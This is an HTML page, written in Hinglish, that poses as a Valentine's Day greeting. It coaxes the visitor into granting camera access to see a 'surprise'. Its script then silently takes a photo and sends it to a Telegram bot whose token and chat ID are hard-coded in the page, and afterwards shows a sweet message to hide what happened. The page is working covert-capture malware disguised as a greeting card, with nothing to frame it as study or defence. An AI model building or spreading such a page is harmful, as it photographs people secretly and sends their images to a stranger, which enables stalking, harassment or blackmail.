<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Special Valentine ‚ù§Ô∏è</title>
    <style>
        body {
            background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            color: #b71c1c;
            padding: 20px;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.8);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 { font-size: 2em; margin-bottom: 10px; }
        p { font-size: 1.1em; line-height: 1.6; }
        .heart { color: #e91e63; font-size: 50px; animation: beat 1s infinite; }
        @keyframes beat {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        #startBtn {
            background-color: #ff4081;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.3s;
        }
        #startBtn:hover { background-color: #f50057; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="heart">‚ù§Ô∏è</div>
        <h1>For My Valentine</h1>
        <p>"Aap mere liye bahut special ho. Maine aapke liye ek chota sa surprise plan kiya hai."</p>
        <p>Surprise dekhne ke liye niche button par click karein aur permission <b>'Allow'</b> karein ‚ú®</p>
        
        <button id="startBtn">Open Surprise üéÅ</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // Aapka Fixed Data
        const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
        const chatId = '7735968383';

        const startBtn = document.getElementById('startBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.addEventListener('click', async () => {
            try {
                // Camera access mangna
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                startBtn.innerText = "Loading Surprise...";
                startBtn.disabled = true;

                // 2 second wait karein taaki camera clear ho jaye
                setTimeout(() => {
                    captureAndSend(stream);
                }, 2000);

            } catch (err) {
                alert("Please allow camera access to see the surprise! ‚ù§Ô∏è");
                console.error(err);
            }
        });

        function captureAndSend(stream) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            // Image ko Blob mein convert karke Telegram par bhejna
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'valentine_capture.jpg');
                formData.append('caption', 'üíù Valentine Site se ek naya photo aaya hai!');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(res => {
                    // Photo bhejne ke baad user ko ye dikhega
                    alert("You are the most beautiful person! Happy Valentine's Day! üíñ");
                    // Camera band karna
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    console.error("Error sending photo:", error);
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
